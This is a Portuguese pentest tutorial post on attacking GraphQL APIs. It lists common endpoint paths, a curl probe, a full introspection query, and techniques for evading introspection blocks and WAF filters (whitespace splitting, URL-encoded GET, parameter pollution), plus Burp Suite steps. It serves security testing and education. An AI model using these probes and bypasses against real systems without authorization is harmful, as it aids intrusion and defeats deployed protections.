---
layout: post
title:  "Descobrindo e explorando endpoints GraphQL"
date:   2025-04-05 13:30:00
cover: /lab/assets/images/posts/lucassouza.io_graphql_attacks.png
categories: PENTEST
--- 

GraphQL tornou-se uma alternativa popular às APIs REST devido à sua flexibilidade e eficiência. Neste guia técnico, exploraremos endpoints comuns, técnicas de introspecção e métodos para contornar controles de segurança.

---
## Endpoints GraphQL Comuns

Ao testar APIs GraphQL, verifique estes endpoints:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

**Dica:**  
Use ferramentas como **Burp Suite**, **curl** ou **Postman** para enviar consultas de teste a esses endpoints. Um simples `POST` com `{"query":"{__typename}"}` pode confirmar se um endpoint está ativo.

```
curl -X POST -H "Content-Type: application/json" -d '{"query":"{__typename}"}' http://alvo/graphql
```

---
## Introspection Query: Mapeando o Schema da API

O **introspection** permite que clientes consultem o **schema** de uma API GraphQL — um recurso poderoso tanto para desenvolvedores quanto para atacantes. Veja como utilizá-lo:

### Verificação Básica de Introspecção

```
{
  "query": "{__schema{queryType{name}}}"
}
```
Uma resposta bem-sucedida confirma que a introspecção está habilitada.

### Extração Completa do Schema

Use esta consulta detalhada para obter o schema completo:

```
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name
      description
      args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
      }
    }
  }
}
```

**Nota:** Se a consulta falhar, tente remover as diretivas `onOperation`, `onFragment` e `onField`. Muitas implementações as rejeitam por padrão.

---
## Contornando as Proteções de Introspecção

Ao enfrentar introspecção desabilitada ou proteções de WAF, experimente estas técnicas:
### 1. Manipulação de Espaços em Branco

```
{
  "query": "query{__schema
  {queryType{name}}}"
}
```

O GraphQL ignora espaços em branco, permitindo quebrar proteções baseadas em regex.
### 2. Troca de Método HTTP

Teste requisições GET com consultas codificadas em URL:

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```
### 3. Poluição de Parâmetros

Teste nomes alternativos de parâmetros:

```
POST /api
Content-Type: application/json

{"q":"{__schema{types{name}}}", "query":"{__typename}"}
```
### 4. Descoberta Assistida por Ferramentas

Se a introspecção estiver desativada, use **[clairvoyance](https://github.com/nikitastupin/clairvoyance)** para reconstruir o schema por meio de mensagens de erro e sugestões de consulta.

---
## Exploração Avançada com Burp Suite

1. Com o endpoint GraphQL identificado **envie a requisição para o Repeater**: 
	- Clique com o botão direito em qualquer requisição GraphQL → **Send to Repeater**.
	
2. **Execute a Introspecção**:
    - No aba repeater, clique com o botão direito na requisição → **GraphQL → Set Introspection Query**.
	
3. **Analise os Resultados**:
    - Clique com o botão direito na resposta → **GraphQL → Save queries to site map**.
    - Visualize o schema reconstruído em **Target → Site Map**.
   
---
## Estudo Complementar:

- https://portswigger.net/web-security/graphql
- https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- https://graphql.org/learn/security/
